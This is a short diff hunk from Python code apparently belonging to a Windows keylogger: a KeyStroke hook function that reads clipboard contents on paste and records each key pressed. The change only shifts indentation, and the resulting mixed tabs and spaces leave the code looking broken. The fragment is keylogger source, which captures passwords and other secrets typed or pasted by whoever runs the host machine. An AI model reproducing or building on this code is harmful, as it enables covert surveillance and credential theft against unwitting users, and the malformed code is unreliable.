@@ -59,12 +59,12 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-           # print "[PASTE] - %s" % (pasted_value),
+          # print "[PASTE] - %s" % (pasted_value),
 		    strhub= "[PASTE] - %s" % (pasted_value),
         else:
            # print "[%s]" % event.Key,
             strhub= "[%s]" % event.Key,
-			return strhub	
+	    	return strhub	
     # pass execution to next hook registered 
     return True
 
